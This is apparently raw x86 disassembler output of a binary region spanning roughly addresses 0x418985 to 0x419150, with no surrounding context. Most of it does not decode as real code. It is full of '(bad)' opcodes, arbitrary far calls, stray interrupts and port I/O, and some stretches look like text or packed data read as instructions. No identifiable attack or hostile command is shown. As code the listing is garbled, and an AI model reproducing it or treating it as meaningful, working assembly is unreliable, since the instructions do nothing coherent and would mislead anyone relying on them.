  418985:	mov    gs,WORD PTR [ebp+0x2424545c]
  41898b:	je     0x4189ed
  41898d:	mov    ah,0x24
  41898f:	and    al,0xd0
  418991:	push   0x8
  418993:	and    al,0x8b
  418995:	sbb    ebx,0x20
  418998:	jge    0x418966
  41899a:	xchg   edi,eax
  41899b:	dec    esp
  41899c:	(bad)  [ebp-0xf]
  41899f:	ins    BYTE PTR es:[edi],dx
  4189a0:	out    0x21,al
  4189a2:	sahf   
  4189a3:	xchg   ebp,eax
  4189a4:	pop    esi
  4189a5:	enter  0xf4ff,0x86
  4189a9:	int    0x6e
  4189ab:	sub    esp,DWORD PTR [ecx-0x75]
  4189ae:	mov    ecx,DWORD PTR [ebx-0x747482bc]
  4189b4:	faddp  st(4),st
  4189b6:	mov    ecx,DWORD PTR [ebx+0x8b]
  4189bc:	add    BYTE PTR [eax],al
  4189be:	add    BYTE PTR [eax],al
  4189c0:	add    BYTE PTR [eax],al
  4189c2:	sbb    BYTE PTR [ebx+0x6d],0x95
  4189c6:	shl    ebx,cl
  4189c8:	push   cs
  4189c9:	inc    ebx
  4189ca:	mov    eax,0xa376888
  4189cf:	xlat   BYTE PTR ds:[ebx]
  4189d0:	or     ah,BYTE PTR [ecx]
  4189d2:	ins    BYTE PTR es:[edi],dx
  4189d3:	outs   dx,DWORD PTR ds:[esi]
  4189d4:	out    0x16,al
  4189d6:	jg     0x418961
  4189d8:	aad    0x3e
  4189da:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  4189e1:	add    DWORD PTR [ebx-0x2084f3f4],0x23
  4189e8:	pop    eax
  4189e9:	or     al,0xc
  4189eb:	retf   
  4189ec:	and    DWORD PTR [edi+0x7a],esi
  4189ef:	call   0xba31:0x29d2b2ce
  4189f6:	scas   al,BYTE PTR es:[edi]
  4189f7:	adc    eax,0x29a6d075
  4189fc:	(bad)  
  4189fe:	sub    al,0x3e
  418a00:	cli    
  418a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a02:	pop    esp
  418a03:	cdq    
  418a04:	enter  0x8eb2,0x2b
  418a08:	pop    ss
  418a09:	xor    al,0xc7
  418a0b:	into   
  418a0c:	aam    0xe3
  418a0e:	or     al,0xc
  418a10:	jns    0x4189f8
  418a12:	or     al,0xc
  418a14:	daa    
  418a15:	add    BYTE PTR [edi],dl
  418a17:	or     al,0x0
  418a19:	pop    ss
  418a1a:	xor    al,0x7
  418a1c:	push   edx
  418a1d:	sub    eax,0xce12a7a1
  418a22:	in     al,dx
  418a23:	lds    ecx,FWORD PTR [ebp+0x785ace9f]
  418a29:	mov    ecx,0xb2c9fbdd
  418a2e:	aaa    
  418a2f:	xor    ebp,esp
  418a31:	add    BYTE PTR [eax],al
  418a33:	add    cl,ah
  418a35:	add    BYTE PTR [ecx+0x51faedc0],cl
  418a3b:	add    BYTE PTR [edx+edi*8+0x61],ah
  418a3f:	xlat   BYTE PTR ds:[ebx]
  418a40:	iret   
  418a41:	outs   dx,DWORD PTR ds:[esi]
  418a42:	mov    ?,WORD PTR [ebp-0x77]
  418a45:	pop    ds
  418a46:	add    ch,dh
  418a48:	int    0xf5
  418a4a:	jp     0x418a2a
  418a4c:	pop    esp
  418a4d:	push   edi
  418a4e:	cmp    BYTE PTR [edi-0x25],dl
  418a51:	add    BYTE PTR [eax],al
  418a53:	fistp  WORD PTR [ebx-0x2c]
	...
  418a5e:	add    BYTE PTR [eax],al
  418a60:	add    BYTE PTR [ecx+0x78],ch
  418a63:	arpl   WORD PTR [eax+eiz*1],di
  418a66:	cs imul esp,DWORD PTR cs:[edx+0x23],0x4165766f
  418a6f:	jo     0x418ada
  418a71:	bound  edi,QWORD PTR gs:[esi]
  418a74:	and    BYTE PTR gs:[eax+esi*2+0x74],al
  418a79:	push   0x73206f20
  418a7e:	bound  esp,QWORD PTR [eax]
  418a80:	dec    ebp
  418a81:	outs   dx,BYTE PTR ds:[esi]
  418a82:	outs   dx,BYTE PTR ds:[esi]
  418a84:	cmp    al,0x79
  418a86:	dec    ebx
  418a87:	ins    DWORD PTR es:[edi],dx
  418a88:	jbe    0x418ada
  418a8a:	bound  esi,QWORD PTR [ebp+0x6f]
  418a8d:	and    BYTE PTR [ebp+0xd],ah
  418a90:	and    BYTE PTR [edi+0x3e],ch
  418a93:	outs   dx,BYTE PTR ds:[esi]
  418a94:	and    BYTE PTR [ebp+0x2f],ah
  418a97:	cs dec ebp
  418a99:	imul   esp,DWORD PTR [ebp+0x6e],0x2e576f0a
  418aa0:	ins    DWORD PTR es:[edi],dx
  418aa1:	ins    DWORD PTR es:[edi],dx
  418aa2:	ins    DWORD PTR es:[edi],dx
  418aa3:	and    BYTE PTR [ecx+ebp*2+0x28],dh
  418aa7:	outs   dx,BYTE PTR ds:[esi]
  418aa8:	push   ebx
  418aa9:	ins    DWORD PTR es:[edi],dx
  418aaa:	je     0x418af9
  418aac:	das    
  418aad:	imul   edx,DWORD PTR [ebx+0x6f],0x203c3d57
  418ab4:	ins    BYTE PTR es:[edi],dx
  418ab5:	push   ebx
  418ab6:	gs gs push 0x65203c22
  418abd:	push   edi
  418abe:	jns    0x418b33
  418ac0:	imul   esi,DWORD PTR [esi+ebp*2+0x65],0x6120443a
  418ac8:	inc    esp
  418ac9:	cmp    ah,BYTE PTR [ebp+0x6e]
  418acc:	dec    ebp
  418acd:	data16 and BYTE PTR [esi+0x65],ah
  418ad1:	jne    0x418b20
  418ad3:	gs dec ebp
  418ad5:	or     al,BYTE PTR [esi+eiz*2+0x41]
  418ad9:	and    BYTE PTR [edx+0x70],dh
  418adc:	add    BYTE PTR [ebx+0x61],bl
  418ae2:	add    BYTE PTR [eax],al
  418ae4:	add    BYTE PTR [eax],al
  418ae6:	add    BYTE PTR [eax],al
  418ae8:	add    al,al
  418aea:	rcr    cl,0x14
  418aed:	jb     0x418a8d
  418aef:	sub    BYTE PTR [edi-0x75e1aad7],cl
  418af5:	iret   
  418af6:	ins    BYTE PTR es:[edi],dx
  418af7:	shl    BYTE PTR ds:0x21ded1d0,0xc9
  418afe:	sub    eax,eax
  418b00:	mov    eax,0xc0c03e56
  418b05:	xlat   BYTE PTR ds:[ebx]
  418b06:	jne    0x418ac8
  418b08:	shl    BYTE PTR [edi+eax*1-0x40],0xc0
  418b0d:	out    dx,eax
  418b0e:	sar    ebp,1
  418b10:	mov    al,ds:0xea884f43
  418b15:	sub    BYTE PTR [edx+0x35],cl
  418b18:	cmp    BYTE PTR [esi],bl
  418b1a:	pop    es
  418b1b:	jecxz  0x418ab5
  418b1d:	call   0x9031dd60
  418b22:	out    dx,eax
  418b23:	inc    ebx
  418b24:	daa    
  418b25:	rol    BYTE PTR [eax],0xf4
  418b28:	mov    ch,0xe7
  418b2a:	add    DWORD PTR [eax],0x0
  418b2d:	add    BYTE PTR [ebp+0x2c],dl
  418b30:	sub    dh,BYTE PTR [ebx-0x3c]
  418b33:	ror    BYTE PTR [edx-0x63cf0cce],cl
  418b39:	mov    ebx,0x3c195a62
  418b3e:	std    
  418b3f:	cmp    DWORD PTR [esi+0x43],0x1103c582
  418b46:	dec    esp
  418b47:	int    0x93
  418b49:	outs   dx,DWORD PTR ds:[esi]
  418b4a:	pop    ss
  418b4b:	adc    eax,0xe2a948d8
  418b50:	mov    DWORD PTR [eax],0xab9100
  418b56:	add    BYTE PTR [eax],al
  418b58:	mov    ecx,DWORD PTR [ebx-0x74747475]
  418b5e:	mov    ecx,DWORD PTR [ebx-0xff3f75]
  418b64:	(bad)  
  418b65:	(bad)  
  418b66:	(bad)  
  418b67:	(bad)  
  418b68:	(bad)  
  418b69:	(bad)  
  418b6a:	(bad)  
  418b6b:	(bad)  
  418b6c:	sldt   WORD PTR [eax]
  418b6f:	xor    al,0x2
  418b71:	cmp    bh,ah
  418b73:	xor    ebx,DWORD PTR [edi-0x54]
  418b76:	or     eax,0x96e6aff1
  418b7b:	xchg   ebp,eax
  418b7c:	inc    ecx
  418b7d:	push   edx
  418b7e:	or     al,0x6
  418b80:	mov    bl,0xfe
  418b82:	xor    DWORD PTR [ecx+0x4f48fd],edi
  418b88:	add    dl,bl
  418b8a:	cli    
  418b8b:	test   al,0x94
  418b8d:	fsub   st,st(2)
  418b8f:	lds    ebx,FWORD PTR [edx]
  418b91:	cmp    BYTE PTR [eax+0x5b],cl
  418b94:	jno    0x418b24
  418b96:	inc    edx
  418b97:	cmc    
  418b98:	push   eax
  418b99:	mov    eax,0x8719f561
  418b9e:	pop    esi
  418b9f:	jle    0x418bff
  418ba1:	in     al,0xe3
  418ba3:	pop    edi
  418ba4:	mov    edx,0x8a00004f
  418ba9:	jnp    0x418c06
  418bab:	add    BYTE PTR [eax],al
  418bad:	mov    edi,0xe00
  418bb2:	cmp    al,0x4b
  418bb4:	jge    0x418c35
  418bb6:	in     al,dx
  418bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bb8:	cs es call 0x9380:0x111af6aa
  418bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bc2:	or     al,0xd7
  418bc4:	xor    DWORD PTR [edi+0xf],esi
  418bc7:	push   ebp
  418bc8:	sbb    ebx,DWORD PTR ds:0x21000000
  418bce:	jno    0x418bd0
  418bd0:	add    bl,dh
  418bd2:	xchg   ebx,eax
  418bd3:	add    BYTE PTR [eax],al
  418bd5:	add    BYTE PTR [ebp-0x7a7a7a7b],al
  418bdb:	test   DWORD PTR [ebp-0x31817a7b],eax
  418be1:	out    dx,al
  418be2:	xchg   ecx,eax
  418be3:	dec    edx
  418be4:	mov    edx,0x70259ec2
  418be9:	ins    BYTE PTR es:[edi],dx
  418bea:	sahf   
  418beb:	and    BYTE PTR [ecx+0x19f574b7],bl
  418bf1:	add    ah,BYTE PTR [ecx+ebp*1-0x173835a3]
  418bf8:	call   0xe92a74e5
  418bfd:	call   0x85c774ea
  418c02:	push   0x8583511b
  418c07:	test   DWORD PTR [ebp+0x3],ecx
  418c0a:	xchg   esp,eax
  418c0b:	cld    
  418c0c:	mov    es,ecx
  418c0e:	dec    ecx
  418c0f:	rcr    DWORD PTR [eax+0x7b],cl
  418c12:	test   dh,0xa8
  418c15:	call   0x730e:0xc1fe155f
  418c1c:	and    al,0xde
  418c1e:	cwde   
  418c1f:	push   cs
  418c20:	mov    bh,0xe9
  418c22:	ja     0x418c65
  418c24:	loopne 0x418bbc
  418c26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c27:	stc    
  418c28:	add    BYTE PTR [eax+0x16],0x85
  418c2c:	test   DWORD PTR [ebx+0x1b],ebp
  418c2f:	test   DWORD PTR [ebp-0x7afb68b4],eax
  418c35:	add    cl,ch
  418c37:	dec    eax
  418c38:	and    al,0x8f
  418c3a:	sub    BYTE PTR [ebx],dl
  418c3c:	ficomp DWORD PTR [eax]
  418c3e:	cdq    
  418c3f:	aas    
  418c40:	std    
  418c41:	shl    DWORD PTR [ebx],cl
  418c43:	sbb    DWORD PTR [ebx],0x43129c93
  418c49:	sbb    al,0x67
  418c4b:	in     eax,dx
  418c4c:	int    0x25
  418c4e:	add    BYTE PTR [eax],al
  418c50:	add    BYTE PTR [esi+0x1f],dl
  418c53:	idiv   DWORD PTR [ecx]
  418c55:	push   esi
  418c56:	inc    edi
  418c57:	stos   DWORD PTR es:[edi],eax
  418c58:	in     eax,dx
  418c59:	add    edx,esp
  418c5b:	add    eax,0x9734228b
  418c60:	add    esp,DWORD PTR [ebx-0x1b]
  418c63:	jb     0x418c87
  418c65:	mov    al,bl
  418c67:	sub    al,0xf
  418c69:	sbb    esp,ecx
  418c6b:	mov    esp,0x19be
  418c70:	push   ecx
  418c71:	arpl   WORD PTR [ecx+0x0],di
  418c74:	add    BYTE PTR [eax],al
  418c76:	lea    ecx,[ebp-0x72727273]
  418c7c:	lea    ecx,[ebp-0x5f550073]
  418c82:	mov    ecx,DWORD PTR [ebx-0x74747475]
  418c88:	mov    ecx,DWORD PTR [ebx+0x5300008b]
  418c8e:	mov    eax,0x469af8c0
  418c93:	or     DWORD PTR [esi+0x22af4cfc],edi
  418c99:	add    esp,DWORD PTR [eax+0x51]
  418c9c:	aam    0x13
  418c9e:	test   al,0x4d
  418ca0:	into   
  418ca1:	and    DWORD PTR [esi],ebx
  418ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ca4:	mov    esp,0xc230000
  418ca9:	add    BYTE PTR [eax],al
  418cab:	push   ecx
  418cac:	dec    ecx
  418cad:	add    BYTE PTR [eax],al
  418caf:	xchg   ebx,eax
  418cb0:	(bad)  
  418cb1:	sbb    BYTE PTR ds:0x9e4745a7,dh
  418cb7:	inc    ebp
  418cb8:	sub    DWORD PTR [edx-0x5b645d27],edx
  418cbe:	sbb    eax,0x3e22d4ff
  418cc3:	or     ch,BYTE PTR [ebx-0x60]
  418cc6:	daa    
  418cc7:	add    BYTE PTR [eax],al
  418cc9:	rol    DWORD PTR [esi+0x7675],1
  418ccf:	add    dh,cl
  418cd1:	ror    esp,0xd1
  418cd4:	(bad)  
  418cd7:	mov    ds:0x9f03fe9c,al
  418cdc:	aam    0x46
  418cde:	int3   
  418cdf:	adc    BYTE PTR [edx],al
  418ce1:	or     BYTE PTR [ecx+0x6ed4b478],cl
  418ce7:	shl    DWORD PTR [eax+0x36],1
  418cea:	sbb    DWORD PTR [ecx+ebp*8-0x4898f372],0x3360
  418cf5:	das    
  418cf6:	loop   0x418cf8
  418cf8:	add    BYTE PTR [eax],al
  418cfa:	mov    ecx,DWORD PTR [ebx-0x74747475]
  418d00:	mov    ecx,DWORD PTR [ebx+0x3fecd08b]
	...
  418d0e:	add    BYTE PTR [ebp+0x75],dh
  418d11:	or     ecx,DWORD PTR [edx]
  418d13:	xchg   edx,eax
  418d14:	sti    
  418d15:	inc    esi
  418d16:	imul   ebp,esi,0xfffffff1
  418d19:	shl    ebx,cl
  418d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d1c:	pop    ebx
  418d1d:	js     0x418d21
  418d1f:	mov    ecx,0x9bc9f594
  418d24:	jno    0x418cfd
  418d26:	int3   
  418d27:	ins    DWORD PTR es:[edi],dx
  418d28:	aaa    
  418d29:	jne    0x418da0
  418d2b:	int3   
  418d2c:	imul   ebp,DWORD PTR [ebp+0x16],0x21
  418d30:	in     al,dx
  418d31:	jle    0x418d22
  418d33:	mov    eax,ds:0x466928ac
  418d38:	lods   eax,DWORD PTR ds:[esi]
  418d39:	xor    BYTE PTR [esi],0xdc
  418d3c:	inc    ebx
  418d3d:	xchg   esi,esp
  418d3f:	pop    edx
  418d40:	in     al,0x51
  418d42:	ds pop ss
  418d44:	xchg   bl,bl
  418d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d47:	es jne 0x418dbf
  418d4a:	mov    dh,0x45
  418d4c:	retf   0x7575
  418d4f:	xchg   edi,eax
  418d50:	outs   dx,DWORD PTR ds:[esi]
  418d51:	ss jne 0x418d54
  418d54:	mov    DWORD PTR [eax],0xd46b7524
  418d5a:	loope  0x418d3b
  418d5c:	js     0x418d48
  418d5e:	pop    ss
  418d5f:	jno    0x418db5
  418d61:	inc    ebp
  418d62:	jae    0x418cf3
  418d64:	mov    eax,ds:0xae51fa52
  418d69:	xchg   esp,eax
  418d6a:	xor    BYTE PTR [eax+eax*1-0x4810000],ch
  418d71:	add    BYTE PTR [eax],al
  418d73:	push   es
  418d74:	and    BYTE PTR [eax],al
	...
  418d7e:	add    BYTE PTR [eax],al
  418d80:	add    BYTE PTR [edi],al
  418d82:	push   0x851746fe
  418d87:	cmp    al,0x71
  418d89:	pop    esi
  418d8a:	sti    
  418d8b:	hlt    
  418d8c:	jno    0x418da4
  418d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d8f:	fisub  WORD PTR ds:0x7ba763a5
  418d95:	in     al,0x6a
  418d97:	jmp    0x418e0b
  418d99:	mov    ecx,DWORD PTR [ebx-0x74747475]
  418d9f:	mov    ecx,DWORD PTR [ebx-0x56000075]
  418da5:	mov    cl,0xff
  418da7:	jg     0x418da8
  418da9:	jmp    FWORD PTR [ebx+0x5c62e665]
  418daf:	mov    dh,0x87
  418db1:	xchg   ebx,eax
  418db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418db3:	retf   
  418db4:	(bad)  
  418db5:	shl    DWORD PTR [ebp+0x22742a76],1
  418dbb:	xchg   DWORD PTR [esi+0x3dd344d0],ebx
  418dc1:	mov    edi,0x5c9d20f4
  418dc6:	fdiv   QWORD PTR [ecx]
  418dc8:	xor    al,0xc2
  418dca:	test   eax,0xffff73fc
  418dcf:	not    BYTE PTR [edi+edi*8-0x1]
  418dd3:	mov    ds:0xff1fac,eax
  418dd8:	hlt    
  418dd9:	cmp    al,0xdb
  418ddb:	nop    DWORD PTR [edx-0xcaf194b]
  418de2:	aam    0xc7
  418de4:	sbb    bh,ah
  418de6:	cwde   
  418de7:	aam    0x68
  418de9:	repnz fwait
  418deb:	xor    BYTE PTR [eax],ch
  418ded:	and    DWORD PTR [esi+0x9],eax
  418df3:	add    ah,BYTE PTR [ebp-0x490366cb]
  418df9:	mov    al,0x4c
  418dfb:	adc    BYTE PTR [eax],0x1c
  418dfe:	icebp  
  418dff:	mov    WORD PTR [ebx-0x18034003],?
  418e05:	pop    ss
  418e06:	cmp    DWORD PTR [edi+0x57deb517],edx
  418e0c:	or     ch,bl
  418e0e:	mov    DWORD PTR [ebp+0x2e530000],0x6c
	...
  418e20:	add    BYTE PTR [ecx+eax*2],bl
  418e23:	push   esp
  418e24:	je     0x418e9a
  418e26:	je     0x418e9c
  418e28:	je     0x418e9e
  418e2a:	je     0x418ea0
  418e2c:	je     0x418e2d
  418e2e:	inc    DWORD PTR [ebp+0x7a12819d]
  418e34:	and    al,0x64
  418e36:	mov    al,0x32
  418e38:	sub    ch,BYTE PTR [edx+0x31]
  418e3b:	xor    edx,DWORD PTR [ebx]
  418e3d:	jbe    0x418e96
  418e3f:	rol    ebx,1
  418e41:	and    al,0x5f
  418e43:	jne    0x418e8a
  418e45:	sub    DWORD PTR [ebx+0x6ac4ffff],esp
  418e4b:	(bad)  
  418e4c:	inc    DWORD PTR [edx-0x54]
  418e4f:	(bad)  
  418e50:	jmp    FWORD PTR [eax-0x6d]
  418e53:	jbe    0x418e8e
  418e55:	arpl   WORD PTR [esi],bx
  418e57:	enter  0xa8b7,0xf0
  418e5b:	sar    bh,cl
  418e5d:	jp     0x418e38
  418e5f:	clc    
  418e60:	add    esi,DWORD PTR [ebx+0x1c]
  418e63:	dec    ecx
  418e64:	lods   eax,DWORD PTR ds:[esi]
  418e65:	cwde   
  418e66:	les    eax,FWORD PTR [eax]
  418e68:	out    dx,eax
  418e69:	call   DWORD PTR [eax-0x62]
  418e6c:	cwde   
  418e6d:	jbe    0x418ed4
  418e6f:	gs gs imul ebp,DWORD PTR cs:[bp+0x6d],0xd706d72
  418e7a:	gs gs ds jne 0x418ee0
  418e7f:	sub    BYTE PTR [ebx+0x66],al
  418e82:	outs   dx,BYTE PTR ds:[esi]
  418e83:	and    ch,BYTE PTR [ebp+0x69]
  418e86:	je     0x418ee9
  418e88:	gs ins BYTE PTR es:[edi],dx
  418e8a:	imul   esp,DWORD PTR [edx+0x20],0x6d204373
  418e91:	cmp    ch,BYTE PTR [ebp+0x74]
  418e94:	inc    esp
  418e95:	and    ch,BYTE PTR [eax+0x53]
  418e98:	inc    ecx
  418e99:	jae    0x418ee8
  418e9b:	arpl   WORD PTR gs:[edi+0x6d],sp
  418e9f:	and    BYTE PTR [edi+eiz*2+0x73],al
  418ea3:	popa   
  418ea4:	jo     0x418f08
  418ea6:	jae    0x418ec8
  418ea8:	ins    DWORD PTR es:[edi],dx
  418ea9:	bound  ebp,QWORD PTR [edi+0x74]
  418eac:	jae    0x418f13
  418eae:	dec    ecx
  418eaf:	ins    DWORD PTR es:[edi],dx
  418eb0:	outs   dx,DWORD PTR ds:[esi]
  418eb1:	pop    ebp
  418eb2:	popa   
  418eb3:	or     eax,0x6472623d
  418eb8:	jo     0x418f32
  418eba:	push   ebx
  418ebb:	arpl   WORD PTR [ebx+0x65],dx
  418ebe:	ds je  0x418f26
  418ec1:	outs   dx,BYTE PTR ds:[esi]
  418ec2:	ins    BYTE PTR es:[edi],dx
  418ec3:	imul   esp,DWORD PTR [ecx+0x3c],0x2f696362
  418eca:	je     0x418f3c
  418ecc:	imul   esi,DWORD PTR [eax+0x65],0x736c7362
  418ed3:	push   ebx
  418ed4:	or     eax,0x84570d3a
  418ed9:	dec    edi
  418eda:	push   eax
  418edb:	push   eax
  418edc:	push   eax
  418edd:	(bad)  
  418ede:	repz jl 0x418ea0
  418ee1:	sub    ch,ah
  418ee3:	gs sub eax,0x7ee2c123
  418ee9:	fidiv  DWORD PTR [edx-0x25904fbc]
  418eef:	fcom   DWORD PTR [esp+edi*1-0x3f89e0d2]
  418ef6:	sbb    al,0x35
  418ef8:	mov    cl,0xdb
  418efa:	je     0x418e86
  418efc:	or     DWORD PTR [edi],esp
  418efe:	retf   0x50c0
  418f01:	push   eax
  418f02:	pusha  
  418f03:	clc    
  418f04:	push   eax
  418f05:	push   eax
  418f06:	push   eax
	...
  418f0f:	add    dh,dh
  418f11:	or     DWORD PTR [ecx-0x17171718],esi
  418f17:	call   0xe92a7804
  418f1c:	add    BYTE PTR [eax],al
  418f1e:	add    al,0x7c
  418f20:	and    eax,0x8656d8c0
  418f25:	aam    0x9f
  418f27:	jle    0x418eb6
  418f29:	or     al,BYTE PTR [edx-0x29]
  418f2c:	dec    ecx
  418f2d:	sbb    bh,BYTE PTR [ebx-0x7b]
  418f30:	lea    ebx,[edi+0x3d]
  418f33:	int3   
  418f34:	or     edi,DWORD PTR [eax+0x0]
  418f37:	add    bl,cl
  418f39:	xchg   esi,eax
  418f3a:	push   ds
  418f3b:	retf   
  418f3c:	pop    edi
  418f3d:	mov    ds:0xe26a013a,eax
  418f42:	mov    ebp,0xb387e501
  418f47:	pusha  
  418f48:	mov    eax,ds:0xb983e9fc
  418f4d:	cmp    BYTE PTR [edx],0x76
  418f50:	add    BYTE PTR [edx+esi*1+0x61],0x2c
  418f55:	add    BYTE PTR [eax],al
  418f57:	jae    0x418fd7
  418f59:	dec    ecx
  418f5a:	add    BYTE PTR [eax],al
  418f5c:	test   al,0xe4
  418f5e:	push   ecx
  418f5f:	add    BYTE PTR [eax],al
  418f61:	cmp    eax,0x18c40016
  418f66:	stos   DWORD PTR es:[edi],eax
  418f67:	test   edi,ecx
  418f69:	loope  0x418f39
  418f6b:	leave  
  418f6c:	adc    ah,BYTE PTR [ebx+edi*2-0x26]
  418f70:	enter  0xf144,0x59
  418f74:	mov    dl,0x8d
  418f76:	inc    esp
  418f77:	jge    0x418f1c
  418f79:	add    BYTE PTR [eax],al
  418f7b:	add    BYTE PTR [edx+0x67],bh
  418f7e:	add    BYTE PTR [eax],al
  418f80:	jnp    0x418f34
	...
  418f8e:	cld    
  418f8f:	sbb    edx,DWORD PTR [edi]
  418f91:	cli    
  418f92:	mov    dl,BYTE PTR [edi+0x48906067]
  418f98:	fild   QWORD PTR [ebx-0x56]
  418f9b:	jmp    ecx
  418f9d:	je     0x418f60
  418f9f:	jbe    0x418f3e
  418fa1:	fistp  QWORD PTR [ebp-0x722a82f9]
  418fa7:	lea    ecx,[ebp-0x72727273]
  418fad:	lea    ecx,[ebp-0x3a029596]
  418fb3:	retf   
  418fb4:	inc    eax
  418fb5:	push   0x6a
  418fb7:	ins    DWORD PTR es:[edi],dx
  418fb8:	in     eax,dx
  418fb9:	ins    DWORD PTR es:[edi],dx
  418fba:	out    dx,eax
  418fbb:	(bad)  
  418fbc:	xchg   ebp,eax
  418fbd:	pop    ebx
  418fbe:	xchg   ecx,eax
  418fbf:	fist   DWORD PTR [edx+0x5efc3b32]
  418fc5:	shl    BYTE PTR [esi],0xa0
  418fc8:	adc    ah,cl
  418fca:	jns    0x418ff8
  418fcc:	add    eax,DWORD PTR [ecx]
  418fce:	rol    BYTE PTR [esi-0x6e],1
  418fd1:	jae    0x418f6f
  418fd3:	inc    ebx
  418fd4:	dec    ebx
  418fd5:	push   ebx
  418fd6:	int3   
  418fd7:	mov    dl,0xa1
  418fd9:	add    DWORD PTR [edx+0x6a],ebp
  418fdc:	iret   
  418fdd:	inc    edi
  418fde:	push   0x6a
  418fe0:	xor    dh,al
  418fe2:	fisubr WORD PTR [edx+0x33]
  418fe5:	push   0x60
  418fe7:	mov    BYTE PTR [ebx-0x6b],bl
  418fea:	fwait
  418feb:	scas   al,BYTE PTR es:[edi]
  418fec:	(bad)  
  418fee:	inc    edi
  418fef:	sbb    BYTE PTR [eax-0x26],ch
  418ff2:	sub    bl,BYTE PTR [eax]
  418ff4:	push   ecx
  418ff5:	cld    
  418ff6:	test   eax,0xcce63cca
  418ffb:	sub    BYTE PTR [edi],bh
  418ffd:	xor    esi,DWORD PTR [ebx]
  418fff:	xor    ecx,esp
  419001:	mov    ds:0x3577a514,eax
  419006:	push   ds
  419007:	xchg   DWORD PTR [esi+0x4d],ecx
  41900a:	mov    dl,0x98
  41900c:	xor    edi,0xab72a6a1
  419012:	mov    ah,0xe9
  419014:	retf   
  419015:	mov    dl,0x46
  419017:	and    BYTE PTR es:[edi+0xb],bh
  41901b:	adc    bl,cl
  41901d:	xor    esi,DWORD PTR [ebx]
  41901f:	mov    ecx,0x3333469c
  419024:	xor    eax,DWORD PTR [eax]
	...
  41902e:	jns    0x41903e
  419030:	test   DWORD PTR [esp],esp
  419033:	and    al,0x24
  419035:	and    al,0x24
  419037:	and    al,0x24
  419039:	and    al,0x0
  41903b:	add    BYTE PTR [edx+0x76],bh
  41903e:	add    BYTE PTR [ebx+0x61],dl
  419041:	cmp    cl,BYTE PTR [ebx+0x39]
  419044:	test   DWORD PTR [ebp+0x52ed0c66],ecx
  41904a:	mov    DWORD PTR [eax+0x41],edi
  41904d:	adc    DWORD PTR [ecx],esp
  41904f:	enter  0xa37b,0xea
  419053:	xchg   BYTE PTR [eax],al
  419055:	add    cl,ch
  419057:	push   ecx
  419058:	add    BYTE PTR [eax],al
  41905a:	lea    ebx,[eax+eax*1+0x0]
  41905e:	hlt    
  41905f:	dec    esp
  419060:	jl     0x41907e
  419062:	and    eax,0xd12f3af1
  419067:	enter  0xa9e3,0x29
  41906b:	push   0xffffff9b
  41906d:	loop   0x41905d
  41906f:	push   ss
  419070:	inc    esp
  419071:	sbb    eax,0x18a0cc13
  419076:	add    BYTE PTR [eax],al
  419078:	out    dx,eax
  419079:	scas   eax,DWORD PTR es:[edi]
  41907a:	dec    edi
  41907b:	inc    ebp
  41907c:	add    BYTE PTR [eax],al
  41907e:	add    BYTE PTR [eax-0x4e],bh
  419081:	or     edx,esp
  419083:	push   ds
  419084:	enter  0xe84b,0xa2
  419088:	pop    ebx
  419089:	pop    ebp
  41908a:	fisubr DWORD PTR [ebx+0x6b2fe64a]
  419090:	jg     0x4190c9
  419092:	(bad)  
  419093:	dec    ecx
  419094:	and    DWORD PTR [edi-0x9],ebx
  419097:	mov    eax,ds:0xf0672889
  41909d:	in     eax,0x5b
  41909f:	pop    ds
  4190a0:	cmp    DWORD PTR ds:0x11340000,0x75000000
  4190aa:	jne    0x419121
  4190ac:	jne    0x419123
  4190ae:	jne    0x419125
  4190b0:	jne    0x419127
  4190b2:	mov    WORD PTR [ebp-0x2b],?
  4190b8:	(bad)  
  4190b9:	(bad)  
  4190ba:	(bad)  
  4190bb:	(bad)  
  4190bc:	(bad)  
  4190bd:	push   DWORD PTR [esp+esi*2+0x71]
  4190c1:	push   ss
  4190c2:	mov    eax,ds:0x2cd4265d
  4190c7:	jl     0x4190b2
  4190c9:	lods   eax,DWORD PTR ds:[esi]
  4190ca:	int    0x44
  4190cc:	sbb    DWORD PTR [eax-0x2c0944b6],0xffffff95
  4190d3:	xlat   BYTE PTR ds:[ebx]
  4190d4:	je     0x41912f
  4190d6:	fcmovu st,st(6)
  4190d8:	je     0x41914e
  4190da:	fbld   TBYTE PTR [edi]
  4190dc:	aam    0x68
  4190de:	clc    
  4190df:	inc    ebx
  4190e0:	push   esi
  4190e1:	xlat   BYTE PTR fs:[ebx]
  4190e3:	dec    esp
  4190e4:	enter  0x2b22,0xba
  4190e8:	retf   0xa5a9
  4190eb:	xchg   ebp,eax
  4190ec:	fwait
  4190ed:	mov    ds:0x23da9ed9,eax
  4190f2:	in     eax,0x73
  4190f4:	xchg   ebp,eax
  4190f5:	mov    dh,0x7c
  4190f7:	je     0x41916d
  4190f9:	(bad)  
  4190fa:	fidivr DWORD PTR [ebx]
  4190fc:	je     0x419172
  4190fe:	mov    bl,0x55
  419100:	xor    DWORD PTR [ebx+ecx*4+0x6],0xfffffff8
  419105:	fs xchg edx,eax
  419107:	call   0x6f768439
  41910c:	in     eax,0x5c
  41910e:	dec    BYTE PTR cs:[ebx+edx*2+0x6ecc06dc]
  419116:	out    0x9f,eax
  419118:	stos   BYTE PTR es:[edi],al
  419119:	sub    DWORD PTR [edx+0x2b8b8b8b],0xffffffd5
  419120:	mov    ecx,DWORD PTR [ebx-0x74749efa]
  419126:	mov    eax,eax
  419128:	rol    al,0xc0
  41912b:	rol    al,0xc0
  41912e:	rol    al,0x99
  419131:	repz push ebx
  419133:	lods   eax,DWORD PTR ds:[esi]
  419134:	ins    DWORD PTR es:[edi],dx
  419135:	add    al,0x8c
  419137:	xor    DWORD PTR [eax-0x2123f825],esp
  41913d:	lock mov cl,0x86
  419140:	int3   
  419141:	mov    al,0x98
  419143:	in     eax,dx
  419144:	ins    DWORD PTR es:[edi],dx
  419145:	push   esi
  419146:	femms  
	...
  419150:	add    bh,bh
